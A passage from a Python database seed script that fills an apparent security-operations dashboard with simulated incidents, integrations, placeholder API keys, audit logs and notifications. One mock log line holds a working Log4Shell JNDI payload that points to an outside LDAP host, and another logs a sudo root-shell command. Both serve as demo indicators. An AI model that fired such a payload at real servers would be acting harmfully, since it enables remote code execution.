                {"technique_id": "T1005", "technique_name": "Data from Local System", "tactic": "Collection"},
            ]
        },
        {
            "public_id": "INC-2024-0845",
            "title": "Lateral Movement via Pass-the-Hash",
            "description": "SIEM correlation detected credential reuse across 6 internal hosts within 4 minutes. NTLM hash extracted from memory dump on compromised DC. Active Directory logs show suspicious authentication.",
            "severity": "CRITICAL",
            "status": "INVESTIGATING",
            "category": "Credential Abuse",
            "source": "SIEM (Splunk)",
            "source_ip": "192.168.1.210",
            "destination_ip": "192.168.1.10",
            "target_system": "Multiple (DC01, APPSVR02, FILESVR01)",
            "assignee": "Alex Rivera",
            "risk_score": 9.5,
            "tags": ["lateral-movement", "credential-theft", "active-directory"],
            "raw_logs": [
                {"time": "08:44:01", "level": "WARN", "msg": "NTLM authentication anomaly", "detail": "DC01: 47 NTLM logon events from 192.168.1.210 in 4 min"},
                {"time": "08:44:03", "level": "ERROR", "msg": "Pass-the-hash indicator", "detail": "Mimikatz-like memory access pattern on WKSTN-DEV-012"},
                {"time": "08:44:08", "level": "ERROR", "msg": "Lateral movement: APPSVR02", "detail": "Successful NTLM auth with harvested hash from domain admin"},
                {"time": "08:44:11", "level": "ERROR", "msg": "Lateral movement: FILESVR01", "detail": "Admin share \\\\FILESVR01\\ADMIN$ accessed"},
            ],
            "detected_at": now - timedelta(minutes=90),
            "created_at": now - timedelta(minutes=90),
            "updated_at": now - timedelta(minutes=30),
            "iocs": [
                {"type": "IP", "value": "192.168.1.210", "confidence": 96.0},
                {"type": "USERNAME", "value": "corp\\domain_admin", "confidence": 98.0},
            ],
            "mitre": [
                {"technique_id": "T1550.002", "technique_name": "Pass the Hash", "tactic": "Lateral Movement"},
                {"technique_id": "T1003.001", "technique_name": "LSASS Memory", "tactic": "Credential Access"},
            ]
        },
        {
            "public_id": "INC-2024-0844",
            "title": "DDoS Attack — Public Web Server",
            "description": "Volumetric DDoS attack targeting primary web server. Peak traffic at 2.4 Gbps from distributed botnet. CDN scrubbing partially effective.",
            "severity": "HIGH",
            "status": "INVESTIGATING",
            "category": "DDoS",
            "source": "Firewall (Palo Alto)",
            "source_ip": "185.22.152.0/24",
            "destination_ip": "78.45.200.10",
            "target_system": "www.company.com (78.45.200.10)",
            "assignee": "Priya Nair",
            "risk_score": 7.5,
            "tags": ["ddos", "availability", "web", "botnet"],
            "raw_logs": [
                {"time": "08:00:05", "level": "WARN", "msg": "Traffic spike detected", "detail": "Inbound: 2.4 Gbps (threshold: 500 Mbps)"},
                {"time": "08:00:07", "level": "ERROR", "msg": "SYN flood detected", "detail": "1.8M SYN packets/sec from 23,400 source IPs"},
                {"time": "08:00:12", "level": "INFO", "msg": "CDN scrubbing activated", "detail": "Cloudflare Under Attack mode enabled"},
            ],
            "detected_at": now - timedelta(hours=2),
            "created_at": now - timedelta(hours=2),
            "updated_at": now - timedelta(minutes=15),
            "iocs": [
                {"type": "IP", "value": "185.22.152.44", "confidence": 88.0},
            ],
            "mitre": [
                {"technique_id": "T1498.001", "technique_name": "Direct Network Flood", "tactic": "Impact"},
            ]
        },
        {
            "public_id": "INC-2024-0843",
            "title": "Data Exfiltration via DNS Tunneling",
            "description": "Unusual DNS query patterns detected from DBSVR01. High-volume TXT record requests to unknown domain. Traffic volume suggests active data extraction via covert channel.",
            "severity": "HIGH",
            "status": "DETECTED",
            "category": "Data Exfiltration",
            "source": "DNS Gateway",
            "source_ip": "192.168.5.20",
            "destination_ip": "8.8.8.8",
            "target_system": "DBSVR01",
            "assignee": "Sarah Chen",
            "risk_score": 8.0,
            "tags": ["exfiltration", "dns-tunnel", "database", "covert-channel"],
            "raw_logs": [
                {"time": "07:12:33", "level": "WARN", "msg": "DNS anomaly detected", "detail": "3,200 TXT queries/min to d2a8kl9p.exfil-domain.net"},
                {"time": "07:12:40", "level": "ERROR", "msg": "Exfiltration volume exceeded", "detail": "Est. transfer: 847MB over last 45 minutes"},
            ],
            "detected_at": now - timedelta(hours=3),
            "created_at": now - timedelta(hours=3),
            "updated_at": now - timedelta(hours=1),
            "iocs": [
                {"type": "DOMAIN", "value": "d2a8kl9p.exfil-domain.net", "confidence": 95.0},
            ],
            "mitre": [
                {"technique_id": "T1071.004", "technique_name": "DNS", "tactic": "Command and Control"},
                {"technique_id": "T1048.003", "technique_name": "Exfiltration Over Alternative Protocol", "tactic": "Exfiltration"},
            ]
        },
        {
            "public_id": "INC-2024-0842",
            "title": "Log4Shell Exploit Attempt on Java App Server",
            "description": "IDS detected CVE-2021-44228 (Log4Shell) exploit string in HTTP request headers targeting legacy Java application. JNDI lookup prevented by Java security manager configuration.",
            "severity": "HIGH",
            "status": "RESOLVED",
            "category": "RCE Exploit",
            "source": "IDS/IPS",
            "source_ip": "91.108.4.236",
            "destination_ip": "10.0.12.80",
            "target_system": "java-app.internal.company.com",
            "assignee": "Sarah Chen",
            "risk_score": 8.2,
            "tags": ["log4shell", "cve-2021-44228", "java", "rce"],
            "raw_logs": [
                {"time": "05:22:11", "level": "ERROR", "msg": "Log4Shell pattern in header", "detail": "User-Agent: ${jndi:ldap://91.108.4.236:1389/a}"},
                {"time": "05:22:11", "level": "INFO", "msg": "JNDI lookup blocked", "detail": "Java security manager denied LDAP connection"},
            ],
            "detected_at": now - timedelta(hours=5),
            "created_at": now - timedelta(hours=5),
            "updated_at": now - timedelta(hours=3),
            "resolved_at": now - timedelta(hours=3),
            "iocs": [
                {"type": "IP", "value": "91.108.4.236", "confidence": 97.0},
                {"type": "URL", "value": "ldap://91.108.4.236:1389/a", "confidence": 95.0},
            ],
            "mitre": [
                {"technique_id": "T1190", "technique_name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
            ]
        },
        {
            "public_id": "INC-2024-0841",
            "title": "Privilege Escalation via Sudo Misconfiguration",
            "description": "A standard user account successfully escalated privileges to root using a misconfigured sudo rule on the CI/CD build server. Admin shell obtained for approximately 12 minutes.",
            "severity": "HIGH",
            "status": "RESOLVED",
            "category": "Privilege Escalation",
            "source": "SIEM (Splunk)",
            "source_ip": "192.168.20.55",
            "destination_ip": "192.168.20.55",
            "target_system": "CI-BUILD-SERVER-02",
            "assignee": "Marcus Webb",
            "risk_score": 7.8,
            "tags": ["privilege-escalation", "sudo", "linux", "ci-cd"],
            "raw_logs": [
                {"time": "02:14:33", "level": "WARN", "msg": "Sudo without password", "detail": "User: dev_jenkins | CMD: sudo /bin/bash (NOPASSWD)"},
                {"time": "02:14:34", "level": "ERROR", "msg": "Root shell obtained", "detail": "UID=0 GID=0 | TTY=/dev/pts/2"},
            ],
            "detected_at": now - timedelta(hours=8),
            "created_at": now - timedelta(hours=8),
            "updated_at": now - timedelta(hours=6),
            "resolved_at": now - timedelta(hours=6),
            "iocs": [
                {"type": "USERNAME", "value": "dev_jenkins", "confidence": 94.0},
            ],
            "mitre": [
                {"technique_id": "T1548.003", "technique_name": "Sudo and Sudo Caching", "tactic": "Privilege Escalation"},
            ]
        },
    ]

    for inc_data in incidents_data:
        iocs = inc_data.pop("iocs", [])
        mitre = inc_data.pop("mitre", [])
        inc = Incident(**inc_data)
        db.add(inc)
        db.flush()

        for i in iocs:
            db.add(IOC(incident_id=inc.id, **i, created_at=inc.created_at))
        for m in mitre:
            db.add(MitreTechnique(incident_id=inc.id, **m))

    # 4. Integrations
    integrations_data = [
        {"name": "Splunk SIEM Core", "provider": "splunk", "category": "SIEM", "status": "SIMULATED", "endpoint_url": "https://siem.corp.internal:8089", "enabled": True},
        {"name": "CrowdStrike Falcon EDR", "provider": "crowdstrike", "category": "EDR", "status": "SIMULATED", "endpoint_url": "https://api.crowdstrike.com", "enabled": True},
        {"name": "Palo Alto Next-Gen Firewall", "provider": "paloalto", "category": "Firewall", "status": "SIMULATED", "endpoint_url": "https://fw-edge.corp.internal/api", "enabled": True},
        {"name": "VirusTotal Threat Intelligence", "provider": "virustotal", "category": "Threat Intel", "status": "SIMULATED", "endpoint_url": "https://www.virustotal.com/api/v3", "enabled": True},
        {"name": "AWS CloudTrail SecOps", "provider": "aws", "category": "Cloud", "status": "SIMULATED", "endpoint_url": "https://cloudtrail.us-east-1.amazonaws.com", "enabled": True},
        {"name": "SOC Slack Incident Channel", "provider": "slack", "category": "Notification", "status": "SIMULATED", "endpoint_url": "https://hooks.slack.com/services/T00/B00/X00", "enabled": True},
    ]
    for integ in integrations_data:
        db.add(Integration(
            name=integ["name"],
            provider=integ["provider"],
            category=integ["category"],
            status=integ["status"],
            endpoint_url=integ["endpoint_url"],
            configuration_metadata={"timeout_seconds": 10, "ssl_verify": True},
            last_checked_at=now - timedelta(minutes=5),
            last_status_message="Simulated endpoint responding with health OK",
            enabled=integ["enabled"],
        ))

    # 5. API Keys (Hashed in DB)
    api_keys_data = [
        {"name": "SIEM Ingest Stream Connector", "prefix": "cs_live_k8j2n...9xQm", "hash_str": "dummy_hash_1", "owner": "admin@cybersentinel.ai", "creator": "Dr. Keanu Makoa", "perms": ["incidents:read", "incidents:write", "logs:ingest"]},
        {"name": "EDR Falcon Push Webhook", "prefix": "cs_live_p3wR7...4zNk", "hash_str": "dummy_hash_2", "owner": "marcus.webb@cybersentinel.ai", "creator": "Marcus Webb", "perms": ["incidents:write", "alerts:push"]},
        {"name": "Palo Alto Firewall Block Action API", "prefix": "cs_live_m9Yx2...7bJp", "hash_str": "dummy_hash_3", "owner": "admin@cybersentinel.ai", "creator": "Dr. Keanu Makoa", "perms": ["incidents:read", "playbooks:execute"]},
    ]
    for k in api_keys_data:
        owner = created_users.get(k["owner"])
        db.add(ApiKey(
            public_id=f"KEY-00{api_keys_data.index(k)+1}",
            name=k["name"],
            owner_id=owner.id if owner else 1,
            created_by_name=k["creator"],
            key_prefix=k["prefix"],
            key_hash=hash_api_key(k["hash_str"]),
            permissions=k["perms"],
            status="active",
            request_count=1420 * (api_keys_data.index(k)+1),
            created_at=now - timedelta(days=20),
            last_used_at=now - timedelta(minutes=2),
        ))

    # 6. Audit Logs
    audit_data = [
        {"public_id": "AUD-8847", "user_email": "sarah.chen@cybersentinel.ai", "user_name": "Sarah Chen", "action": "TRIAGE_EXECUTED", "resource": "INCIDENT", "resource_id": "INC-2024-0847", "detail": "AI triage triggered on ransomware incident", "severity": "info", "time_offset": 5},
        {"public_id": "AUD-8846", "user_email": "marcus.webb@cybersentinel.ai", "user_name": "Marcus Webb", "action": "INCIDENT_STATUS_CHANGED", "resource": "INCIDENT", "resource_id": "INC-2024-0842", "detail": "Status changed from investigating → resolved", "severity": "info", "time_offset": 20},
        {"public_id": "AUD-8845", "user_email": "admin@cybersentinel.ai", "user_name": "Dr. Keanu Makoa", "action": "API_KEY_CREATED", "resource": "API_KEY", "resource_id": "KEY-001", "detail": "SIEM API key generated with scoped permissions", "severity": "warning", "time_offset": 35},
        {"public_id": "AUD-8844", "user_email": "alex.rivera@cybersentinel.ai", "user_name": "Alex Rivera", "action": "PLAYBOOK_EXECUTED", "resource": "INCIDENT", "resource_id": "INC-2024-0845", "detail": "Containment playbook step 1-3 executed (SIMULATION)", "severity": "info", "time_offset": 50},
        {"public_id": "AUD-8843", "user_email": "sarah.chen@cybersentinel.ai", "user_name": "Sarah Chen", "action": "LOGIN_SUCCESS", "resource": "AUTH", "resource_id": "sarah.chen@cybersentinel.ai", "detail": "Successful JWT authentication from corporate subnet", "severity": "info", "time_offset": 120},
    ]
    for aud in audit_data:
        db.add(AuditLog(
            public_id=aud["public_id"],
            user_email=aud["user_email"],
            user_name=aud["user_name"],
            action=aud["action"],
            resource=aud["resource"],
            resource_id=aud["resource_id"],
            detail=aud["detail"],
            severity=aud["severity"],
            ip_address="192.168.100.10",
            timestamp=now - timedelta(minutes=aud["time_offset"]),
        ))

    # 7. Notifications
    notifs_data = [
        {"title": "CRITICAL: Ransomware on WKSTN-FIN-043", "message": "EDR agent quarantined host. Immediate triage required.", "color": "#FF3366", "severity": "critical", "read": False},
        {"title": "NEW: SQL Injection on customer API", "message": "WAF blocked attacker IP 45.155.204.127.", "color": "#FF3366", "severity": "critical", "read": False},
        {"title": "AI Triage complete: INC-2024-0845", "message": "Pass-the-Hash analysis confidence: 95%.", "color": "#00D4FF", "severity": "info", "read": False},
        {"title": "INC-2024-0842 resolved by Sarah Chen", "message": "Log4Shell exploit mitigated.", "color": "#00FF88", "severity": "success", "read": True},
    ]
    for n in notifs_data:
        db.add(Notification(
            title=n["title"],
            message=n["message"],
            color=n["color"],
            severity=n["severity"],
            read=n["read"],
            created_at=now - timedelta(minutes=10 * (notifs_data.index(n)+1)),
        ))

    db.commit()
